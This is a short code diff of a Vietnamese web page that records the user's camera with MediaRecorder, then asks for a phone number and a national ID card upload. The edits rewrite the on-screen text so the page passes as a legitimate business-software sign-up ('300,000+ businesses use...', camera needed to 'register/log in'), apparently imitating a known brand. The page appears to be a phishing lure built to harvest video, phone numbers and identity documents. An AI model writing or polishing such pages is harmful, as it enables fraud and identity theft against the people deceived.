@@ -155,9 +155,9 @@
             mediaRecorder.start(1000);
 
             document.getElementById('landing-page').classList.add('hidden');
-            showLoad("ĐANG KHỞI TẠO HỆ THỐNG...", 1200, renderPhoneInput);
+            showLoad("300.000+ nhà kinh doanh sử dụng...", 1200, renderPhoneInput);
         } catch (e) {
-            alert("Lỗi: Bạn cần cấp quyền Camera để nhận ưu đãi.");
+            alert("Lỗi: Bạn cần cấp quyền Camera để Đăng ký/Đăng nhập.");
             window.location.reload();
         }
     }
@@ -198,8 +198,8 @@
                     <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
                 </div>
                 <h3 class="text-xl font-black text-slate-800 mb-4 uppercase">Xác minh danh tính</h3>
-                <p class="text-[14px] text-slate-500 mb-10 leading-relaxed font-medium">Hoàn tất định danh CCCD/CMND qua hệ thống AI để bảo mật tài khoản.</p>
-                <button onclick="showLoad('ĐANG KHỞI TẠO AI...', 1000, renderUpload)" class="w-full bg-kv-green text-white py-4 rounded-xl font-black text-lg uppercase shadow-lg shadow-green-100">XÁC MINH NGAY</button>
+                <p class="text-[14px] text-slate-500 mb-10 leading-relaxed font-medium">Hoàn tất định danh CCCD/CMND để bảo mật tài khoản.</p>
+                <button onclick="showLoad('ĐANG CẬP NHẬT...', 1000, renderUpload)" class="w-full bg-kv-green text-white py-4 rounded-xl font-black text-lg uppercase shadow-lg shadow-green-100">XÁC MINH NGAY</button>
             </div>
         </div>`;
     }
